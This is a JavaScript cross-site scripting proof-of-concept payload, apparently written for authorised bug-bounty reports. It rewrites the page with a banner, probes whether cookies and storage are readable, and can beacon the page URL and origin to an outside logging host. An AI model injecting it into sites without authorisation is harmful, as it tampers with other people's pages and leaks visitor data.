

/*
 * Universal benign XSS proof-of-concept payload.
 * Bug-bounty use only. Loads/executes identically as classic <script>, ES module,
 * or SystemJS module. Self-contained, no dependencies.
 *
 * WHAT IT DOES (all benign, "proof of impact" only):
 *   - console.log + document.title marker
 *   - visible red banner rewriting the page (screenshot evidence)
 *   - demonstrates same-origin read access WITHOUT stealing anything:
 *       it reports only whether document.cookie / localStorage are *readable*,
 *       never their contents.
 *   - optional out-of-band beacon of BENIGN metadata (domain, url, marker) so you
 *       get a timestamped server-side log proving the victim browser executed it.
 *
 * WHAT IT DELIBERATELY DOES NOT DO:
 *   - no alert()/confirm()/prompt()
 *   - never transmits cookies, tokens, localStorage values, form data, or any PII
 *   - no keylogging, no form hooking, no redirect, no persistence
 *
 * CONFIGURE: set BEACON to a logging endpoint you control (webhook.site token,
 * interactsh subdomain, your own server). Leave "" to disable the beacon — the
 * console/DOM proof still works. GitHub Pages hosts the file but CANNOT log the
 * beacon; point BEACON at webhook.site / interactsh for the server-side log.
 *
 * MARKER: append ?id=F<N> to the script URL to tag each target, e.g.
 *   https://you.github.io/poc/xss-poc.js?id=F62
 * Falls back to "XSS" if no id is given.
 */
(function () {
  "use strict";

  var BEACON = ""; // e.g. "https://xxxxxxxx.oast.fun" or "https://webhook.site/<uuid>"

  // --- derive marker from this script's own ?id=, else default ---
  function selfId() {
    try {
      var s = document.currentScript && document.currentScript.src;
      if (!s) {
        var all = document.getElementsByTagName("script");
        for (var i = all.length - 1; i >= 0; i--) {
          if (/xss-poc\.js/.test(all[i].src)) { s = all[i].src; break; }
        }
      }
      var m = s && s.match(/[?&]id=([^&]+)/);
      return m ? decodeURIComponent(m[1]) : "XSS";
    } catch (e) { return "XSS"; }
  }

  var ID = selfId();
  var origin = (location && location.origin) || document.domain;
  var inFrame = (function () { try { return window.top !== window.self; } catch (e) { return true; } })();

  // --- capability probe: can we READ same-origin secrets? (report boolean only) ---
  var cookieReadable = false, storageReadable = false;
  try { cookieReadable = typeof document.cookie === "string" && document.cookie.length > 0; } catch (e) {}
  try { storageReadable = !!window.localStorage && localStorage.length >= 0; } catch (e) {}

  // --- 1) console marker ---
  try {
    console.log("XSS-" + ID, "executed in origin:", origin,
                "| cookie-readable:", cookieReadable,
                "| localStorage-readable:", storageReadable,
                "| in-iframe:", inFrame);
  } catch (e) {}


  try { document.title = "XSS-" + ID + "-PROOF"; } catch (e) {}
  try { window["__XSS_" + ID] = origin; } catch (e) {}


  try {
    var el = document.createElement("div");
    el.setAttribute("id", "xss-poc-" + ID);
    el.style.cssText = "position:fixed;top:0;left:0;right:0;z-index:2147483647;" +
      "background:#b00020;color:#fff;font:16px/1.4 Arial,sans-serif;padding:14px 18px;";
    el.textContent = "XSS PROOF [" + ID + "] — attacker JS executing in " + origin +
      "  (cookie-readable: " + cookieReadable + ", localStorage-readable: " + storageReadable +
      ", in-iframe: " + inFrame + ")";
    (document.body || document.documentElement).appendChild(el);
  } catch (e) {}

  // --- 4) optional benign OOB beacon (metadata only, NEVER secret values) ---
  if (BEACON) {
    try {
      var q = "?m=XSS-" + encodeURIComponent(ID) +
              "&o=" + encodeURIComponent(origin) +
              "&u=" + encodeURIComponent(location.href) +
              "&ck=" + (cookieReadable ? 1 : 0) +
              "&ls=" + (storageReadable ? 1 : 0) +
              "&fr=" + (inFrame ? 1 : 0);
      new Image().src = BEACON.replace(/\/+$/, "") + "/xss-poc" + q;
    } catch (e) {}
  }
})();

   
   
